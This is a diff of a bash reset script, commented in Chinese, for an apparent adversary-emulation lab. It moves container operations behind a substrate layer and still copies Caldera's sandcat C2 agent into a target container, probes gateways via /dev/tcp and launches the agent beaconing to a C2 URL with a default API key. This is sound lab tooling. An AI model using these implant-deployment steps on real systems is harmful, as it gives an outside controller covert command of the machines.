@@ -1,4 +1,11 @@
 #!/bin/bash
+# shellcheck disable=SC2154
+#
+# ↑ 文件级豁免 SC2154（"引用了但没赋值"）。原因：基质层的变量（`lab_substrate` / `lab_bin` /
+#   `lab_topology` / `lab_inspect_json`）由 `. edge_lab.sh` 在 source 时赋值，而 shellcheck
+#   不跨文件跟踪变量 —— 不豁免就会把**抽象本身**报成缺陷。代价如实写在这里：本文件里将来手打
+#   一个拼错的 `$lab_xxx` 也不会被 shellcheck 报出来。ShellCheck 0.9 不支持按名字限定豁免，
+#   故这件事改由**测试**兜住（`build/test-edge-lab.sh` 会断言"基质调用序列逐条相等"）。
 # ============================================================================
 # edge_reset.sh —— 每个场景的"干净环境"复位（spec §5 / §5.3）
 # ============================================================================
@@ -19,12 +26,18 @@
 # 比一次失败危险得多：它会以完全正常的语气进入报告）。
 #
 # 环境变量（全部可选）：
+#   EDGEEXP_SUBSTRATE    实验基质：clab（默认，今天的行为）| lxd（A-1，见 edge_lab.sh）
 #   EDGEEXP_TOPOLOGY     拓扑文件，默认 <lab>/asscor.clab.yml
 #   EDGEEXP_TARGET_HOST  攻击目标节点名（不带 clab 前缀），默认 host1
 #   EDGEEXP_CALDERA_URL  Caldera API，默认 http://127.0.0.1:8888
 #   EDGEEXP_CALDERA_KEY  API key，默认 ADMIN123（本机 Caldera 的 --insecure 部署值）
 #   EDGEEXP_CALDERA_HOME Caldera 安装目录，默认 /opt/caldera
 #   EDGEEXP_CALDERA_BOOT_S / EDGEEXP_NODE_WAIT_S / EDGEEXP_AGENT_WAIT_S  各阶段超时（秒）
+#
+# 基质边界（Task 4D Step 1）：本脚本的"建/毁拓扑、在目标内执行、把文件送进目标、取目标信息"
+# 四类动作全部经 `edge_lab.sh`（**唯一**的基质调用点）。复位**语义**（destroy 可容忍 + I9 补断言、
+# 等全部节点 running、C2 地址逐个探测、agent 回看 last_seen）与门禁**一行未动** ——
+# 换基质只换"命令发到哪"，不换"什么算成功"。
 # ============================================================================
 set -euo pipefail
 
@@ -33,7 +46,11 @@ SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
 LAB_DIR="$(dirname "$SCRIPT_DIR")"
 DATA_DIR="${EDGEEXP_DATA_DIR:-$LAB_DIR/data/edgefactors}"
 RUN_D="$DATA_DIR/run.d"
-TOPOLOGY="${EDGEEXP_TOPOLOGY:-$LAB_DIR/asscor.clab.yml}"
+# shellcheck source=scripts/edge_lab.sh
+. "$SCRIPT_DIR/edge_lab.sh"
+# 拓扑路径的**唯一来源**是基质层（`edge_lab.sh` 按自己的位置解析），这里只是取个短名字 ——
+# 两份各自解析会在 EDGEEXP_TOPOLOGY 未设时给出同一个值，但真源只有一个。
+TOPOLOGY="$lab_topology"
 TARGET="${EDGEEXP_TARGET_HOST:-host1}"
 CALDERA_URL="${EDGEEXP_CALDERA_URL:-http://127.0.0.1:8888}"
 CALDERA_KEY="${EDGEEXP_CALDERA_KEY:-ADMIN123}"
@@ -46,8 +63,18 @@ mkdir -p "$RUN_D"
 FILLER="reset-${SCENARIO:-noarg}.json"
 TMP_OUT="$RUN_D/.$FILLER.tmp"
 
-for bin in clab docker curl python3 sha256sum; do
+for bin in curl python3 sha256sum; do
   command -v "$bin" >/dev/null 2>&1 || { echo "edge_reset: 缺少必需命令 $bin" >&2; exit 1; }
+done
+# 基质的 CLI 由 `edge_lab.sh` 决定（clab 基质要 clab+docker；lxd 基质要 lxc）。检查放在基质层
+# 里做，是为了让"哪条命令缺失"这句话只有一份实现 —— 而它缺失时的症状（命令找不到）在两种
+# 基质上一模一样，正是最容易被读成"环境问题"的那一类。
+case "$lab_substrate" in
+  clab) NEED_BINS=(clab docker) ;;
+  lxd)  NEED_BINS=("$lab_bin") ;;
+esac
+for bin in "${NEED_BINS[@]}"; do
+  command -v "$bin" >/dev/null 2>&1 || { echo "edge_reset: 缺少必需命令 $bin（基质 $lab_substrate）" >&2; exit 1; }
 done
 [ -f "$TOPOLOGY" ] || { echo "edge_reset: 拓扑文件不存在: $TOPOLOGY" >&2; exit 1; }
 
@@ -89,44 +116,21 @@ ensure_caldera() {
 }
 T0=$(now_s); ensure_caldera "$T0" || exit 1
 
-# 节点计数（`clab inspect --format json` 是权威视图，不是解析 yml 的缩进）。回显 "total up down"。
+# 节点计数（基质的拓扑视图是权威视图，不是解析 yml 的缩进）。回显 "total up down"。
+# 实现在 `edge_lab.sh` 的 `lab_node_counts`（clab 分支与抽象前逐字等价）。
 # **inspect 本身失败时回显 `-1 -1 -1`**（而不是 0 0 0）：0 节点的含义是"拓扑已清空"，那是一条
 # 会被"destroy 之后断言拓扑为空"采信的结论 —— inspect 挂了却报 0 会让那条断言**空洞地通过**
 # （Fix round 2 的 I9 项）。等待循环只看 total > 0，-1 会被当作"还没就绪"继续等。
-clab_node_counts() {
-  clab inspect -t "$TOPOLOGY" --format json > /tmp/edgeexp-clab-inspect.json 2>>/tmp/edgeexp-clab-inspect.log
-  local rc=$?
-  python3 - "$rc" <<'PY'
-import json, sys
-rc = int(sys.argv[1])
-if rc != 0:
-    print(-1, -1, -1); raise SystemExit
-try:
-    data = json.load(open('/tmp/edgeexp-clab-inspect.json'))
-except Exception:
-    print(-1, -1, -1); raise SystemExit
-# clab 的 --format json 是 {<lab 名>: [节点…]}（0.78 实测）；同时兼容 {containers:[…]} 形态
-nodes = []
-if isinstance(data, dict):
-    if isinstance(data.get('containers'), list):
-        nodes = data['containers']
-    else:
-        for value in data.values():
-            if isinstance(value, list):
-                nodes.extend(value)
-elif isinstance(data, list):
-    nodes = data
-up = sum(1 for c in nodes if (c.get('state') or '').lower() in ('running', 'up'))
-print(len(nodes), up, len(nodes) - up)
-PY
-}
+# 名字保留（`clab_node_counts`）：本脚本内部有四处调用点，改名会让 I9 那段的注释与代码
+# 同时要动 —— 那正是"顺手重构"的边界。它现在只是基质层的一个别名。
+clab_node_counts() { lab_node_counts; }
 
 # --- 2. destroy + deploy -----------------------------------------------------
 # destroy 的失败**不是**关键路径失败：没部署过任何容器时它本来就会报错，而那一趟的语义
 # 正是"从干净状态开始"。关键路径是 deploy —— 它没有任何容错。
 T0=$(now_s)
 DESTROY_TOLERATED=0
-if clab destroy -t "$TOPOLOGY" --cleanup >/tmp/edgeexp-clab-destroy.log 2>&1; then
+if lab_down >/tmp/edgeexp-clab-destroy.log 2>&1; then
   echo "edge_reset: clab destroy 完成"
 else
   DESTROY_TOLERATED=1
@@ -157,7 +161,7 @@ EOF
 fi
 
 T0=$(now_s)
-clab deploy -t "$TOPOLOGY"   # 关键路径：失败即整轮失败（不做 --reconfigure）
+lab_up   # 关键路径：失败即整轮失败（不做 --reconfigure）
 deploy_s=$(( $(now_s) - T0 ))
 echo "edge_reset: clab deploy 完成（${deploy_s}s）"
 
@@ -193,11 +197,11 @@ fi
 # 容器名 = <拓扑 prefix>-<lab 名>-<节点名>（本拓扑 prefix=asc ⇒ asc-asscor-host1）。
 # prefix 由拓扑自己声明，脚本**不硬编码**：从 `clab inspect` 的视图里按后缀取节点名，
 # 拓扑改 prefix 时这里不会变成一次"目标节点不存在"的假故障。
-NODE="$(python3 - "$TARGET" <<'PY'
+NODE="$(python3 - "$TARGET" "$lab_inspect_json" <<'PY'
 import json, sys
 target = sys.argv[1]
 try:
-    data = json.load(open('/tmp/edgeexp-clab-inspect.json'))
+    data = json.load(open(sys.argv[2]))
 except Exception:
     print(''); raise SystemExit
 nodes = []
@@ -212,7 +216,7 @@ for c in nodes:
 PY
 )"
 [ -n "$NODE" ] || { echo "edge_reset: 在拓扑里找不到节点 $TARGET 的容器（见 /tmp/edgeexp-clab-inspect.json）" >&2; exit 1; }
-docker inspect "$NODE" >/dev/null 2>&1 || { echo "edge_reset: 目标节点容器不存在: $NODE" >&2; exit 1; }
+lab_inspect "$NODE" >/dev/null 2>&1 || { echo "edge_reset: 目标节点容器不存在: $NODE" >&2; exit 1; }
 PAYLOAD="$CALDERA_HOME/plugins/sandcat/payloads/sandcat.go-linux"
 [ -f "$PAYLOAD" ] || { echo "edge_reset: sandcat payload 不存在: $PAYLOAD（Caldera 启动时是否漏了 -P sandcat?）" >&2; exit 1; }
 
@@ -222,7 +226,7 @@ T0=$(now_s)
 # 那个地址不是 WSL 主机 —— 实测过：按默认网关拼 URL 的 sandcat 会**静默**起不来
 # （容器里进程在跑、Caldera 里 agent 一直 untrusted，而 reset 只会在超时后报"没有回连"）。
 # 判据只能是"真的能连上 8888"：候选 = 管理网（eth0）网关 + 默认网关，逐个探测 TCP。
-MGMT_CIDR="$(docker exec "$NODE" ip -4 -o addr show eth0 2>/dev/null | awk '{print $4; exit}')"
+MGMT_CIDR="$(lab_node_ip "$NODE" eth0)"
 MGMT_GW="$(python3 - "$MGMT_CIDR" <<'PY'
 import ipaddress, sys
 cidr = (sys.argv[1] if len(sys.argv) > 1 else '').strip()
@@ -233,7 +237,7 @@ except Exception:
     print('')
 PY
 )"
-DEFAULT_GW="$(docker exec "$NODE" ip route | awk '/^default/{print $3; exit}')"
+DEFAULT_GW="$(lab_target_exec "$NODE" ip route | awk '/^default/{print $3; exit}')"
 
 SANDCAT_URL=""
 CANDIDATES="$MGMT_GW $DEFAULT_GW"
@@ -241,7 +245,7 @@ PROBED=""
 for cand in $CANDIDATES; do
   [ -n "$cand" ] || continue
   PROBED="$PROBED $cand"
-  if docker exec "$NODE" bash -c "timeout 3 bash -c 'echo > /dev/tcp/$cand/8888' 2>/dev/null"; then
+  if lab_target_exec "$NODE" bash -c "timeout 3 bash -c 'echo > /dev/tcp/$cand/8888' 2>/dev/null"; then
     SANDCAT_URL="http://$cand:8888"
     break
   fi
@@ -251,16 +255,16 @@ done
   exit 1
 }
 echo "edge_reset: C2 地址 $SANDCAT_URL（管理网网关 $MGMT_GW / 默认网关 $DEFAULT_GW）"
-docker exec "$NODE" bash -c "rm -f /tmp/sandcat /tmp/sandcat.log"
-docker cp "$PAYLOAD" "$NODE:/tmp/sandcat" >/dev/null
-docker exec "$NODE" chmod 755 /tmp/sandcat
+lab_target_exec "$NODE" bash -c "rm -f /tmp/sandcat /tmp/sandcat.log"
+lab_push "$PAYLOAD" "$NODE" /tmp/sandcat >/dev/null
+lab_target_exec "$NODE" chmod 755 /tmp/sandcat
 # 本节要证明的是"**本次**部署的 agent 真的在跳"，不是"Caldera 记得有个 agent"：
 # Caldera 会保留已被销毁容器的 agent 条目（last_seen 停在容器消失那一刻），
 # 只按 host 名匹配会在**新 agent 根本没起来**时误判成功（实测：上一次部署的 agent
 # 让检查在 1s 内"通过"，而那 1s 里新容器里连 sandcat 都还没启动）。
 # 故以"启动时刻"为界：只有 last_seen **不早于**启动时刻的条目才算数。
 AGENT_SINCE="$(now_rfc3339)"
-docker exec -d "$NODE" bash -c "/tmp/sandcat --server $SANDCAT_URL > /tmp/sandcat.log 2>&1"
+lab_target_exec_detached "$NODE" bash -c "/tmp/sandcat --server $SANDCAT_URL > /tmp/sandcat.log 2>&1"
 
 paw=""
 waited=0
@@ -292,7 +296,7 @@ done
 agent_wait_s=$(( $(now_s) - T0 ))
 if [ -z "$paw" ]; then
   echo "edge_reset: sandcat agent 在 ${AGENT_WAIT_S}s 内没有回连 $SANDCAT_URL（判据：host=$TARGET 且 trusted 且 last_seen ≥ $AGENT_SINCE）—— 攻击侧不可用，整轮失败" >&2
-  docker exec "$NODE" tail -20 /tmp/sandcat.log >&2 || true
+  lab_target_exec "$NODE" tail -20 /tmp/sandcat.log >&2 || true
   exit 1
 fi
 echo "edge_reset: agent 就绪（host=$TARGET paw=$paw，等待 ${agent_wait_s}s）"
